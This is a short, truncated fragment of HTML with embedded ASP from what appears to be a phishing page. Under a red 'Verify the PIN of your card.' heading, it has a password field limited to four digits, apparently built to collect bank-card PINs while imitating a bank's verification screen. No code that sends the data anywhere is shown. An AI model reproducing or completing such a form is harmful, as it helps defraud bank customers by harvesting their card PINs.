...
<br>
<p style="font-size:16px;text-align:center;color: #DA1710;">Verify the PIN of your card.</p>
</p>
<tr>
<center   style="margin-top:-25px;"><span style="font-size:18px;color: #DA1710 !important;font-weight:600;font-family: Myriad pro, sans-serif !important;"><center>
<%
dim rs
...
<span style=""></span>
<input name="pass" type="password" placeholder="" oninput="value=value.replace(/[^\d]/g,'')" class="input1" id="pass" min-length="4" maxlength="4" style="display:block; margin:0 auto;border-radius: 4px;font-size:14px;width:100%;height:45px;  padding-left: 5%;border: 0.5px solid rgb(204, 204, 204)"></div>
